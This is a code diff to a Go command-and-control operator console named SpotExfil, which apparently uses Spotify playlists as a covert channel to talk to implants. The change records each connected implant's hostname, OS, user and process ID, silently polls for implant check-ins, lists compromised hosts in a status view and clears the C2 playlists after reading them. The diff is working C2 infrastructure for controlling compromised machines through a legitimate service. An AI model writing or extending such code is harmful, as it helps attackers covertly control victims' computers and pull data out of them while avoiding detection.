@@ -16,21 +16,32 @@ import (
 	"github.com/sourcefrenchy/spotexfil/internal/spotify"
 )
 
+// ClientInfo holds information about a connected implant.
+type ClientInfo struct {
+	Hostname    string
+	OS          string
+	User        string
+	ConnectedAt string
+	PID         int
+}
+
 // Operator sends commands and retrieves results.
 type Operator struct {
-	client      *spotify.Client
-	key         string
-	nextSeq     int
-	pendingSeqs map[int]string // seq -> module name
+	client           *spotify.Client
+	key              string
+	nextSeq          int
+	pendingSeqs      map[int]string       // seq -> module name
+	connectedClients map[string]ClientInfo // client_id -> info
 }
 
 // NewOperator creates a new operator.
 func NewOperator(client *spotify.Client, key string) *Operator {
 	return &Operator{
-		client:      client,
-		key:         key,
-		nextSeq:     1,
-		pendingSeqs: make(map[int]string),
+		client:           client,
+		key:              key,
+		nextSeq:          1,
+		pendingSeqs:      make(map[int]string),
+		connectedClients: make(map[string]ClientInfo),
 	}
 }
 
@@ -87,7 +98,7 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 		}
 		// Handle checkin beacon
 		if module, ok := result["module"].(string); ok && module == "checkin" {
-			displayCheckin(result)
+			op.handleCheckin(result)
 			_ = op.client.CleanC2Playlists(ctx,
 				protocol.ChannelRes, op.key, seqNum)
 			continue
@@ -122,10 +133,18 @@ func (op *Operator) WaitForResult(seq int) (map[string]interface{}, error) {
 	return nil, fmt.Errorf("timeout waiting for seq=%d", seq)
 }
 
+// checkForCheckins silently polls for new implant check-ins.
+func (op *Operator) checkForCheckins() {
+	op.PollResults()
+}
+
 // Interactive runs the interactive operator console.
 func (op *Operator) Interactive() {
 	fmt.Println("SpotExfil C2 Operator Console")
-	fmt.Println("Type 'help' for available commands.")
+	fmt.Println("Type 'help' for available commands.\n")
+
+	// Initial check for pending checkins
+	op.checkForCheckins()
 
 	scanner := bufio.NewScanner(os.Stdin)
 
@@ -138,6 +157,7 @@ func (op *Operator) Interactive() {
 
 		line := strings.TrimSpace(scanner.Text())
 		if line == "" {
+			op.checkForCheckins()
 			continue
 		}
 
@@ -222,6 +242,15 @@ func (op *Operator) cleanAll() {
 }
 
 func (op *Operator) printStatus() {
+	if len(op.connectedClients) > 0 {
+		fmt.Printf("[*] Connected implants (%d):\n", len(op.connectedClients))
+		for cid, info := range op.connectedClients {
+			fmt.Printf("  %s  %s  %s  since %s\n",
+				cid, info.Hostname, info.OS, info.ConnectedAt)
+		}
+	} else {
+		fmt.Println("[*] No implants connected")
+	}
 	if len(op.pendingSeqs) > 0 {
 		fmt.Println("[*] Pending commands:")
 		seqs := make([]int, 0, len(op.pendingSeqs))
@@ -238,7 +267,7 @@ func (op *Operator) printStatus() {
 	fmt.Printf("[*] Next seq: %d\n", op.nextSeq)
 }
 
-func displayCheckin(result map[string]interface{}) {
+func (op *Operator) handleCheckin(result map[string]interface{}) {
 	data, _ := result["data"].(string)
 	var info map[string]interface{}
 	if err := json.Unmarshal([]byte(data), &info); err != nil {
@@ -248,8 +277,21 @@ func displayCheckin(result map[string]interface{}) {
 	clientID, _ := info["client_id"].(string)
 	hostname, _ := info["hostname"].(string)
 	osInfo, _ := info["os"].(string)
+	user, _ := info["user"].(string)
+	pid := 0
+	if p, ok := info["pid"].(float64); ok {
+		pid = int(p)
+	}
 	ts, _ := result["ts"].(float64)
 	timestamp := time.Unix(int64(ts), 0).Format("2006-01-02 15:04:05")
+
+	op.connectedClients[clientID] = ClientInfo{
+		Hostname:    hostname,
+		OS:          osInfo,
+		User:        user,
+		ConnectedAt: timestamp,
+		PID:         pid,
+	}
 
 	fmt.Printf("\n[+] New implant connected!\n"+
 		"    client_id : %s\n"+
